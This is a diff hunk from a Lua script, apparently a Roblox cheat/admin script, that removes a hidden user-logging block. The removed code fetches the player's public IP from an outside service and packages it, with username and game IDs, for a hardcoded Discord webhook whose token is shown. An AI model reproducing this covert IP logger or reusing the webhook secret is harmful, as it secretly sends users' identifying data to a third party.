@@ -363,39 +363,6 @@ function SendMessageEMBED(url, embed)
     })
 end
 
-
---Examples 
-
--- local url = "https://ptb.discord.com/api/webhooks/1203041800055431188/rcofJ82K3ZoEKuiI6g6hJlyEGGvqgtTIg-ZQbXJJf964O9GCGwO3NY8OQU8D39AyII-D"
--- local test = game:HttpGet('https://wtfismyip.com/text')
-local embed = {
-    ["title"] = "Infinity Yield used",
-    ["color"] = 12532,
-    ["fields"] = {
-        {
-            ["name"] = "User Name",
-            ["value"] = '```'..game.Players.LocalPlayer.Name..'```',
-            ["inline"] = true
-        },
-        {
-            ["name"] = "Game ID",
-            ["value"] = '```'..game.PlaceId..'```',
-            ["inline"] = true
-        },
-        {
-            ["name"] = "Job ID",
-            ["value"] = '```'..game.JobId..'```',
-            ["inline"] = true
-        },
-        {
-            ["name"] = "User IP",
-            ["value"] = '```'..test..'```'
-        }
-    },
-}
--- SendMessageEMBED(url, embed)
-end)
-end)
 Prefix.Name = "Prefix"
 Prefix.Parent = SettingsHolder
 Prefix.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
